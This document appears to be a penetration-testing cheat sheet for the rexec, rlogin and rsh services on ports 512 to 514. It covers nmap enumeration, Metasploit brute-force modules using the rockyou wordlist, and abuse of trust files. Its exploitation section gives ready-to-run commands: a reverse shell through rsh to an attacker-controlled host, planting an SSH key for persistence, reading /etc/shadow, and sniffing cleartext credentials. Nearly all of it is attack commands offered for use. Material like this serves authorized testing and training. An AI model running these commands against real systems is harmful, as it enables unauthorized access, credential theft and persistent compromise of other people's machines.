# Port 512, 513, 514 - R-Services (rexec, rlogin, rsh)

## Table of Contents
- [Overview](#overview)
- [Port 512 - Rexec](#port-512---rexec)
- [Port 513 - Rlogin](#port-513---rlogin)
- [Port 514 - RSH](#port-514---rsh)
- [Exploitation](#exploitation)

---

## Overview

### Quick Check (One-liner)

```shell
nmap -sV -p 512,513,514 $rhost && rlogin -l root $rhost 2>/dev/null
```

| Port | Service | Description |
| :--- | :--- | :--- |
| 512 | rexec | Remote execution (requires password) |
| 513 | rlogin | Remote login |
| 514 | rsh | Remote shell |

> ⚠️ These services are insecure and transmit data in cleartext

---

## Port 512 - Rexec

### Enumeration

```shell
nmap -sV -sC -p 512 $rhost
```

### Connect

```shell
# Using rexec
rexec $rhost -l username command

# Example
rexec $rhost -l root id
```

### Brute Force

```shell
# Metasploit
use auxiliary/scanner/rservices/rexec_login
set RHOSTS $rhost
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## Port 513 - Rlogin

### Enumeration

```shell
nmap -sV -sC -p 513 $rhost
```

### Connect

```shell
# Using rlogin
rlogin $rhost -l username

# From specific local user
rlogin $rhost -l root
```

### Trust Exploitation

```shell
# If trusted (no password required)
rlogin $rhost -l root

# Check /etc/hosts.equiv or ~/.rhosts on target
# + + allows any host/user
```

### Brute Force

```shell
# Metasploit
use auxiliary/scanner/rservices/rlogin_login
set RHOSTS $rhost
set USERNAME root
run
```

---

## Port 514 - RSH

### Enumeration

```shell
nmap -sV -sC -p 514 $rhost
```

### Execute Commands

```shell
# Using rsh
rsh $rhost -l username command

# Examples
rsh $rhost -l root id
rsh $rhost -l root cat /etc/passwd
rsh $rhost -l root cat /etc/shadow
```

### Trust Exploitation

```shell
# If target trusts your host
rsh $rhost id

# Check trusted hosts
rsh $rhost cat /etc/hosts.equiv
rsh $rhost cat ~/.rhosts
```

### Brute Force

```shell
# Metasploit
use auxiliary/scanner/rservices/rsh_login
set RHOSTS $rhost
set USERNAME root
run
```

---

## Exploitation

### Trust Relationships

```shell
# Check for trust files
# /etc/hosts.equiv - system-wide trust
# ~/.rhosts - per-user trust

# Content format:
# hostname [username]
# + +              <- trusts everyone (very dangerous)
# 192.168.1.10 root
```

### Reverse Shell via RSH

```shell
# If you have rsh access
rsh $rhost "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
```

### Add SSH Key via RSH

```shell
# If you have rsh access
rsh $rhost "mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
```

### Sniff Credentials

```shell
# All r-services send credentials in cleartext
tcpdump -i eth0 port 512 or port 513 or port 514 -A
```

---

## Metasploit Modules

```shell
# Rexec login scanner
use auxiliary/scanner/rservices/rexec_login

# Rlogin login scanner  
use auxiliary/scanner/rservices/rlogin_login

# RSH login scanner
use auxiliary/scanner/rservices/rsh_login
```

---

## Quick Reference

| Service | Port | Command |
| :--- | :--- | :--- |
| rexec | 512 | `rexec $rhost -l user command` |
| rlogin | 513 | `rlogin $rhost -l user` |
| rsh | 514 | `rsh $rhost -l user command` |

| File | Description |
| :--- | :--- |
| `/etc/hosts.equiv` | System-wide trusted hosts |
| `~/.rhosts` | Per-user trusted hosts |
